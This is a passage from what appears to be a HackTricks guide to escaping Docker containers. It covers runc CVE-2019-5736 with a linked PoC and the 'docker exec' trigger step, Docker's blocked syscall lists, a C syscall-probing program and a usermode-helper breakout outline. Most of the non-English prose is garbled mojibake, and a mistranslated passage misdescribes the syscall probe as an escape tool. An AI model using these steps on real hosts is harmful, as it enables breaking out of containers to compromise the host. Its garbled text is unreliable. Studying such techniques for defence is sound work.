рдпрджрд┐ рдЖрдк `docker exec` рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ sudo рдХреЗ рд╕рд╛рде), рддреЛ рдЖрдк CVE-2019-5736 рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣рд╛рдВ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╣реИ [рдпрд╣рд╛рдВ](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go))ред рдпрд╣ рддрдХрдиреАрдХ рдореВрд▓ рд░реВрдк рд╕реЗ **рдореЗрдЬрд╝рдмрд╛рди** рд╕реЗ **рд╣реЛрд╕реНрдЯ** рдХреЗ _**/bin/sh**_ рдмрд╛рдЗрдирд░реА рдХреЛ **рдЕрдзрд┐рд▓реЗрдЦрд┐рдд** рдХрд░реЗрдЧреА, рдЗрд╕рд▓рд┐рдП рдХреЛрдИ рднреА docker exec рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдкреЗрд▓реЛрдб рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдкреЗрд▓реЛрдб рдХреЛ рдЕрдиреБрд╕рд╛рд░ рдмрджрд▓реЗрдВ рдФрд░ `go build main.go` рдХреЗ рд╕рд╛рде main.go рдХреЛ рдмрдирд╛рдПрдВред рдкрд░рд┐рдгрд╛рдореА рдмрд╛рдЗрдирд░реА рдХреЛ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд░рдЦрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред\
рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди, рдЬреИрд╕реЗ рд╣реА рдпрд╣ `[+] Overwritten /bin/sh successfully` рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЖрдкрдХреЛ рдореЗрдЬрд╝рдмрд╛рди рдорд╢реАрди рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

`docker exec -it <container-name> /bin/sh`

рдпрд╣ рдкреЗрд▓реЛрдб рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ рдЬреЛ рдореБрдЦреНрдп.go рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

{% hint style="info" %}
рдХрдВрдЯреЗрдирд░ рдХреЛ рдЕрдиреБрд░реВрдк рд╣реЛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдЕрдиреНрдп CVEs рд╣реИрдВ, рдЖрдк [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list) рдореЗрдВ рд╕реВрдЪреА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

## рдбреЙрдХрд░ рдХрд╕реНрдЯрдо рдПрд╕реНрдХреЗрдк

### рдбреЙрдХрд░ рдПрд╕реНрдХреЗрдк рд╕рд░рдлреЗрд╕

* **рдиреЗрдорд╕реНрдкреЗрд╕:** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрд▓рдЧ** рд░рдЦрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рддрд╛рдХрд┐ рд╣рдо рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рдХрд╛рд░рдг рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЗрдВрдЯрд░реИрдХреНрдЯ рдХрд░рдиреЗ рд╕реЗ рдмрдЪ рд╕рдХреЗрдВ (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ IPCs, рдпреВрдирд┐рдХреНрд╕ рд╕реЙрдХреЗрдЯреНрд╕, рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдПрдВ, D-Bus, рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ `/proc` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред
* **рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛**: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реИ (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╕реАрдорд┐рдд рд╣реИрдВ)ред
* **рдХреНрд╖рдорддрд╛рдПрдБ**: рдбреЙрдХрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд╖рдорддрд╛рдПрдБ рдЫреЛрдбрд╝рддрд╛ рд╣реИ: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
* **рд╕рд┐рд╕рдХреЙрд▓реНрд╕**: рдпреЗ рд╕рд┐рд╕рдХреЙрд▓реНрд╕ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ **рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЙрд▓ рдирд╣реАрдВ рдХрд░ рд╕рдХреЗрдЧрд╛** (рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдХрдореА + Seccomp рдХреЗ рдХрд╛рд░рдг)ред рдмрдЪреЗ рд╣реБрдП рд╕рд┐рд╕рдХреЙрд▓реНрд╕ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

{% tabs %}
{% tab title="x64 рд╕рд┐рд╕рдХреЙрд▓реНрд╕" %}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{% endtab %}

{% tab title="arm64 рд╕рд┐рд╕рдХреЙрд▓реНрд╕" %}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% tab title="syscall_bf.c" %}рд╣рдордиреЗ рдПрдХ рдирдпрд╛ рдЯреВрд▓ рдмрдирд╛рдпрд╛ рд╣реИ рдЬрд┐рд╕реЗ "syscall_bf" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЯреВрд▓ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╣реЛрд╕реНрдЯ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╣рд╛рд╕рд┐рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣ред рдЗрд╕ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рджрд╛рдЦрд┐рд▓ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
